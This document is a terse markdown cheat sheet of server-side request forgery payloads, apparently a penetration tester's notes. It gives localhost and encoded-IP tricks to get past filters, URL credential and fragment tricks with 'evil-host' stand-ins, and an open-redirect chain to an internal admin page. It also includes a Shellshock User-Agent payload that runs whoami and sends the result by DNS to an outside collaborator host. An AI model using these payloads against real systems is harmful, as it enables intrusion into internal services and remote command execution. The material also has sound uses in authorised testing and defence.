### SSRF
This vulnerability helps attacker to send request to back-end systems. 
If vulnerable >> 500 Internal server error
### Tips
Try with port number, path.
## Commom method (api parameter)
```txt
http://localhost/
http://127.0.0.1/
```
## Blind Method
#### Just place burpcollaborator server in referer header
```txt
Referer: http://burpcollaborator.net
```
#### Shellshock exploitation via SSRF
```txt
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
```
## Circumventing common SSRF defenses
_____________________________________
### SSRF with blacklist-based input filters
```txt
http://127.1
http://2130706433
http://017700000001
http://spoofed.burpcollaborator.net
```
### SSRF with whitelist-based input filters
#### You can embed credentials in a URL before the hostname, using the @ character. For example:
```txt
    https://expected-host:fakepassword@evil-host
    https://expected-host:fakepassword@burpcollaborator.net
```
#### You can use the # character to indicate a URL fragment. For example:
```txt
    https://evil-host#@expected-host
    https://burpcollaborator.net#@google.com
```
Double URL-encode # to %2523.
#### You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```txt
    https://expected-host.evil-host
    https://google.com.burpcollaborator.net
```
### Bypassing SSRF filters via open redirection
#### For example, the application contains an open redirection vulnerability in which the following URL (http://evil-user.net):
```txt
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
#### You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: 
```txt
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
